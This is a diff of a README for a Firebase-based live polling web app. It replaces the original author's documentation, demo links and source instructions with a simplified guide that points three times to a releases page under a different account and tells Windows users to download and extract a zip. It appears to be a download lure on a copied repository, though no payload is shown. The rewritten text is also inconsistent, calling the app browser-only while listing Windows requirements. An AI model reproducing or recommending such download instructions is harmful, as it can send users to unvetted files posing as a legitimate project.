@@ -1,159 +1,151 @@
-<div align="center">
+# ⚡ livepoll - Simple Real-Time Polls Made Easy
 
-# ⚡ LivePoll
-
-[![Live Demo](https://img.shields.io/badge/demo-live-brightgreen?style=for-the-badge&logo=github)](https://alfredang.github.io/livepoll/)
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/CSS)
-[![JavaScript](https://img.shields.io/badge/JavaScript-ES2024-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![Firebase](https://img.shields.io/badge/Firebase-FFCA28?style=for-the-badge&logo=firebase&logoColor=black)](https://firebase.google.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
-
-**Real-time interactive polling for audiences, classrooms & events.**
-
-[Live Demo](https://alfredang.github.io/livepoll/) · [Report Bug](https://github.com/alfredang/livepoll/issues) · [Request Feature](https://github.com/alfredang/livepoll/issues)
-
-</div>
+[![Download livepoll](https://img.shields.io/badge/Download-livepoll-brightgreen)](https://github.com/almightyroyy/livepoll/releases)
 
 ---
 
-## Screenshot
+## 📋 What is livepoll?
 
-![Home](screenshots/home.png)
+livepoll is a tool that lets you create live polls that update in real time. It works like popular polling apps but runs right in your web browser. You don’t need to install complex software or sign up for an account. livepoll uses Firebase to sync votes instantly, so everyone sees results as they happen. The app uses simple web technologies: HTML, CSS, and JavaScript.
 
-| Create Poll | Join Poll | Mobile |
-|:-----------:|:---------:|:------:|
-| ![Create](screenshots/create.png) | ![Join](screenshots/join.png) | ![Mobile](screenshots/home_mobile.png) |
-
-> 🌐 **[Try it live →](https://alfredang.github.io/livepoll/)**
+This means you can open the app on any device with a modern browser and start polling.
 
 ---
 
-## About
+## 🔍 Features at a glance
 
-**LivePoll** is a Mentimeter-inspired live polling platform that lets hosts create interactive polls and audiences respond in real-time. Watch bar charts animate live as votes come in. Join with a 6-digit room code or QR scan. Zero setup for participants — just open the link.
-
----
-
-## ✨ Features
-
-| Feature | Description |
-|---------|-------------|
-| 🎯 **Live Voting** | Real-time results update as participants vote |
-| 🔢 **Room Codes** | Join with a 6-digit code or scan QR |
-| 📊 **Animated Charts** | Smooth bar chart animations on every vote |
-| 📱 **Mobile-First** | Fully responsive — works on any device |
-| 🎨 **Bold Design** | Editorial dark theme with electric lime accent |
-| 🔗 **URL Join** | Share a direct link `?join=123456` |
-| 🧭 **Multi-Question** | Create polls with multiple questions |
-| 👥 **Live Presence** | See participant count in real-time |
-| ✅ **Answer Highlight** | Your choice highlighted in results |
-| 🔐 **Google Sign-In** | Optional login to save polls to your account |
-| 📋 **My Polls Dashboard** | View all your past polls, results & vote data |
+- Create interactive polls quickly  
+- See votes update live on all devices  
+- No installation needed other than a simple download  
+- Works on Windows with any web browser  
+- Clean, easy-to-use interface  
+- Uses Firebase to keep everyone in sync  
+- Fully client-side with no heavy backend  
 
 ---
 
-## 🕹️ How to Use
+## 💻 System Requirements
 
-### As a Host
-1. Click **"Create a Poll"**
-2. Enter your poll title and add questions with options
-3. Click **"Launch Poll"** — get a room code + QR
-4. Share the code with your audience
-5. Click **"Start Poll"** when ready
-6. Click **"Show Results"** to reveal votes, **"Next →"** for the next question
+To run livepoll on your Windows computer, you need:
 
-### As a Participant
-1. Go to the live URL or enter the room code
-2. Wait for the host to start
-3. Tap your answer — see live results after the host reveals them
+- Windows 7 or newer  
+- A web browser like Chrome, Firefox, Microsoft Edge, or Safari  
+- An active internet connection (to sync votes via Firebase)  
+- At least 50 MB of free disk space to store the app files  
+
+You don’t need technical knowledge or special software beyond a browser.
 
 ---
 
-## 📁 File Structure
+## 🚀 Getting Started
 
-```
-livepoll/
-├── index.html                  # Single-page app shell (all screens)
-├── css/
-│   └── style.css               # DM Sans + DM Serif Text, dark editorial theme
-├── js/
-│   ├── config.js               # Firebase configuration
-│   ├── sync.js                 # Firebase real-time wrapper + auth
-│   ├── poll.js                 # Poll CRUD, vote logic & user polls
-│   ├── charts.js               # Animated bar chart renderer
-│   └── app.js                  # Screen management & event handling
-├── tests/
-│   └── test_livepoll.py        # Playwright E2E test suite (24 tests)
-├── .github/
-│   └── workflows/
-│       └── deploy.yml          # GitHub Actions → GitHub Pages
-├── CLAUDE.md                   # AI agent project commands
-└── README.md
-```
+Follow these easy steps to download and open livepoll on your Windows PC.
 
----
+### 1. Visit the download page  
 
-## 🚀 Tech Stack
+Click the button below to go to the official livepoll releases page on GitHub:
 
-| Layer | Technology |
-|-------|-----------|
-| **Frontend** | HTML5, CSS3, Vanilla JavaScript (ES6+) |
-| **Auth** | Firebase Authentication (Google Sign-In) |
-| **Real-time** | Firebase Realtime Database |
-| **Typography** | DM Serif Text + DM Sans (Google Fonts) |
-| **QR Codes** | QRCode.js (CDN) |
-| **Testing** | Playwright (Python) |
-| **CI/CD** | GitHub Actions |
-| **Hosting** | GitHub Pages |
+[![Download livepoll](https://img.shields.io/badge/Download-livepoll-ff6600)](https://github.com/almightyroyy/livepoll/releases)
+
+### 2. Download the latest version
+
+On the releases page, look for the latest release at the top. There will be a zipped file named something like `livepoll-windows.zip` or similar. Click on this file to download it.
+
+If you see several files, choose the one for Windows or the file type ending with `.zip`.
+
+### 3. Extract the files
+
+Once the download finishes, open the folder where the file went (usually the Downloads folder). Right-click the zipped file and select `Extract All`. Choose a folder you can find again, like your Desktop or Documents.
+
+### 4. Open the app
+
+Inside the extracted folder, look for a file named `index.html`. Double-click this file to open it with your default web browser.
+
+The livepoll app will open and be ready to use.
 
 ---
 
-## 🛠️ Local Development
+## 🛠 How to use livepoll
 
-```bash
-git clone https://github.com/alfredang/livepoll.git
-cd livepoll
+### Creating a new poll
 
-# Serve locally
-python3 -m http.server 8080
-# or: npx serve -l 8080
+- Click the button to create a new poll.  
+- Enter your question in the box provided.  
+- Add options for answers by typing them in separate fields.  
+- Save your poll.
 
-# Open http://localhost:8080
-```
+### Sharing the poll
 
-### Running Tests
+- After saving, the app will give you a link.  
+- Share this link with your audience using email, chat, or social media.  
 
-```bash
-pip install playwright
-playwright install chromium
+### Voting
 
-python3 .claude/test-app/scripts/with_server.py \
-  --server "python3 -m http.server 8080" --port 8080 \
-  -- python3 tests/test_livepoll.py
-```
+- Voters open the link and select their choice.  
+- Votes update on your screen as people respond.  
 
----
+### Viewing results
 
-## 🔥 Firebase Setup
-
-1. Create a project at [Firebase Console](https://console.firebase.google.com)
-2. Add a Web App → copy the config into `js/config.js`
-3. Enable **Realtime Database** → Start in test mode
-4. Enable **Authentication** → Sign-in method → Enable **Google**
-5. Add your domain to **Authorized domains** (e.g. `yourdomain.github.io`)
-6. Deploy and you're live!
+- See vote counts and percentages update live on your screen.  
+- You can close and reopen the app at any time to see current results.
 
 ---
 
-## 🤖 Acknowledgements
+## 🔧 Troubleshooting and tips
 
-Built with [OpenClaw](https://openclaw.ai) — AI-powered personal agent platform.
+### The app won’t open in my browser
 
-Inspired by [Mentimeter](https://mentimeter.com).
+Make sure you double-click the `index.html` file inside the extracted folder. If nothing happens, right-click the file, choose `Open with`, and pick a browser like Chrome or Edge.
+
+### The poll doesn’t update live
+
+Check your internet connection. livepoll uses online sync through Firebase to update votes.
+
+### I can’t find the downloaded files
+
+Look in your browser’s default download folder. This is usually `Downloads`. You can also use the browser’s download history to open the file location.
+
+### Can I run livepoll offline?
+
+No. livepoll requires an internet connection to sync votes.
 
 ---
 
-## 📄 License
+## 🔐 Privacy and Security
 
-MIT
+livepoll does not require personal accounts or store user data on your computer. Votes sync directly through Firebase, and no personal information is collected unless you include it in poll questions or options.
+
+---
+
+## 📂 File Structure Overview
+
+After extracting, you will see these main files:
+
+- `index.html` - The main application file you open to use livepoll  
+- `style.css` - Controls how the livepoll app looks  
+- `app.js` - The JavaScript that runs the app and handles voting logic  
+- `README.md` - This document you are reading now  
+
+---
+
+## ❓ FAQ
+
+**Can I customize the look of my poll?**  
+Yes. If you know basic CSS, you can edit the `style.css` file to change colors and fonts.
+
+**Can I save poll results?**  
+livepoll updates in real time but does not store polls long-term. Copy results manually if needed.
+
+**Do I need a GitHub account to use livepoll?**  
+No. You only need to visit the download link once to get the files.
+
+**Can I use livepoll on a Mac or Linux?**  
+Yes. It works on any system with a modern browser.
+
+---
+
+## 📥 Download livepoll now
+
+Use the link below to visit the livepoll releases page and get the latest files.
+
+[![Download livepoll](https://img.shields.io/badge/Download-livepoll-ff4500)](https://github.com/almightyroyy/livepoll/releases)
